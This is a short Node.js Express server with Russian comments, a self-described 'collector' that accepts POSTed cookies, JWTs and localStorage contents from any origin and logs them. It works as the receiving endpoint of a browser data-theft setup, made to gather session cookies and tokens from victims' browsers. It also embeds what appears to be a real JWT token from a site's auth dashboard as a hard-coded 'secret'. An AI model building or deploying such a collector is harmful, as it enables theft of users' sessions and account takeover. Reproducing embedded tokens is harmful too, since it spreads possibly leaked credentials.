// server.js
const express = require('express');
const jwtLib = require('jsonwebtoken');
const app = express();

// 🔑 Секрет для верификации JWT (замените на ваш реальный секрет)
const JWT_SECRET = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2dnZHJvcC5yZWQvYXBpL2F1dGgvZGFzaGJvYXJkIiwiaWF0IjoxNzUzNzcyOTgwLCJuYmYiOjE3NTM3NzI5ODAsImp0aSI6Im9ZRWF1b01pbmxXdkZqd24iLCJzdWIiOjQ2MzQyMzUsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.gmoaE4ylS4vH6d13BRKCFGFfenxPHDt75yDBkN8umR8';

// 1. Разрешаем CORS и парсим JSON
app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// 2. Обработчик сбора данных
app.post('/collect', (req, res) => {
  const { cookies = [], jwt = null, storage = {}, timestamp = null } = req.body;

  // 2.1. Проверка JWT (если пришёл)
  let validJwt = false;
  if (jwt) {
    try {
      jwtLib.verify(jwt, JWT_SECRET);
      validJwt = true;
    } catch (e) {
      console.warn('Invalid JWT:', e.message);
    }
  }

  // 2.2. Логируем всё
  console.log('--- New collection @', timestamp);
  console.log('JWT valid:', validJwt);
  console.log('Cookies:', cookies);
  console.log('LocalStorage keys:', Object.keys(storage));

  // 2.3. Отвечаем клиенту
  res.json({
    status: 'ok',
    jwtValid: validJwt,
    receivedCookies: cookies.length,
    receivedStorage: Object.keys(storage).length
  });
});

// 3. Запуск
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Collector server listening on port ${PORT}`);
});
